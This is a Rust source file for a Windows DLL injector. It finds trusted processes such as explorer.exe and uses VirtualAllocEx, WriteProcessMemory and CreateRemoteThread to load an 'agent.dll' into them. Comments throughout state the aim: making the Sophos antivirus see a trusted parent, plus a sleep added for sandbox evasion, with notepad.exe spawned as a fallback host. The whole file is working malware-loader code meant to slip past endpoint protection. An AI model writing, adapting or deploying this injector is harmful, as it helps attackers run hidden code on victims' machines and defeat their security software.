// Process Injector - Injects agent DLL into trusted process
// Runs agent inside explorer.exe/notepad.exe so Sophos sees trusted parent

use std::ptr;
use std::ffi::CString;
use std::mem;
use std::thread;
use std::time::Duration;
use std::env;
use std::path::PathBuf;

type HANDLE = *mut std::ffi::c_void;
type DWORD = u32;
type LPVOID = *mut std::ffi::c_void;
type SIZE_T = usize;
type BOOL = i32;
type LPCSTR = *const i8;

const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
const MEM_COMMIT: DWORD = 0x1000;
const MEM_RESERVE: DWORD = 0x2000;
const PAGE_READWRITE: DWORD = 0x04;
const PAGE_EXECUTE_READ: DWORD = 0x20;
const INFINITE: DWORD = 0xFFFFFFFF;

#[repr(C)]
struct PROCESSENTRY32 {
    dwSize: DWORD,
    cntUsage: DWORD,
    th32ProcessID: DWORD,
    th32DefaultHeapID: usize,
    th32ModuleID: DWORD,
    cntThreads: DWORD,
    th32ParentProcessID: DWORD,
    pcPriClassBase: i32,
    dwFlags: DWORD,
    szExeFile: [i8; 260],
}

#[link(name = "kernel32")]
extern "system" {
    fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) -> HANDLE;
    fn CloseHandle(hObject: HANDLE) -> BOOL;
    fn VirtualAllocEx(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID;
    fn WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: *const u8, nSize: SIZE_T, lpNumberOfBytesWritten: *mut SIZE_T) -> BOOL;
    fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: LPVOID, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: *mut DWORD) -> HANDLE;
    fn GetModuleHandleA(lpModuleName: LPCSTR) -> HANDLE;
    fn GetProcAddress(hModule: HANDLE, lpProcName: LPCSTR) -> LPVOID;
    fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) -> DWORD;
    fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE;
    fn Process32First(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> BOOL;
    fn Process32Next(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> BOOL;
    fn VirtualProtectEx(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: *mut DWORD) -> BOOL;
    fn GetLastError() -> DWORD;
}

const TH32CS_SNAPPROCESS: DWORD = 0x00000002;

fn find_process(name: &str) -> Option<DWORD> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_null() { return None; }
        
        let mut entry: PROCESSENTRY32 = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32>() as DWORD;
        
        if Process32First(snapshot, &mut entry) != 0 {
            loop {
                let exe_name: String = entry.szExeFile.iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| c as u8 as char)
                    .collect();
                
                if exe_name.to_lowercase() == name.to_lowercase() {
                    CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }
                
                if Process32Next(snapshot, &mut entry) == 0 { break; }
            }
        }
        
        CloseHandle(snapshot);
        None
    }
}

fn inject_dll(pid: DWORD, dll_path: &str) -> bool {
    unsafe {
        // Open target process
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            return false;
        }
        
        // Get LoadLibraryA address
        let kernel32 = CString::new("kernel32.dll").unwrap();
        let loadlib = CString::new("LoadLibraryA").unwrap();
        let k32 = GetModuleHandleA(kernel32.as_ptr());
        let load_library_addr = GetProcAddress(k32, loadlib.as_ptr());
        
        if load_library_addr.is_null() {
            CloseHandle(process);
            return false;
        }
        
        // Allocate memory in target for DLL path
        let dll_path_bytes = dll_path.as_bytes();
        let path_len = dll_path_bytes.len() + 1;
        
        let remote_mem = VirtualAllocEx(process, ptr::null_mut(), path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote_mem.is_null() {
            CloseHandle(process);
            return false;
        }
        
        // Write DLL path to target process
        let mut written: SIZE_T = 0;
        let path_cstring = CString::new(dll_path).unwrap();
        if WriteProcessMemory(process, remote_mem, path_cstring.as_ptr() as *const u8, path_len, &mut written) == 0 {
            CloseHandle(process);
            return false;
        }
        
        // Create remote thread calling LoadLibraryA(dll_path)
        let mut thread_id: DWORD = 0;
        let thread = CreateRemoteThread(process, ptr::null_mut(), 0, load_library_addr, remote_mem, 0, &mut thread_id);
        
        if thread.is_null() {
            CloseHandle(process);
            return false;
        }
        
        // Wait for DLL to load
        WaitForSingleObject(thread, 5000);
        
        CloseHandle(thread);
        CloseHandle(process);
        true
    }
}

fn get_dll_path() -> PathBuf {
    // DLL should be next to injector
    let exe_path = env::current_exe().unwrap_or_default();
    exe_path.parent().unwrap_or(&PathBuf::new()).join("agent.dll")
}

fn main() {
    // Delay for sandbox evasion
    thread::sleep(Duration::from_secs(3));
    
    let dll_path = get_dll_path();
    let dll_str = dll_path.to_string_lossy().to_string();
    
    if !dll_path.exists() {
        return;
    }
    
    // Target processes - try in order of preference
    let targets = ["explorer.exe", "sihost.exe", "taskhostw.exe", "RuntimeBroker.exe"];
    
    for target in &targets {
        if let Some(pid) = find_process(target) {
            if inject_dll(pid, &dll_str) {
                // Success - DLL injected, exit injector
                thread::sleep(Duration::from_secs(1));
                return;
            }
        }
    }
    
    // Fallback: spawn notepad and inject
    if let Ok(child) = std::process::Command::new("notepad.exe")
        .spawn()
    {
        thread::sleep(Duration::from_millis(500));
        let pid = child.id();
        inject_dll(pid, &dll_str);
    }
}
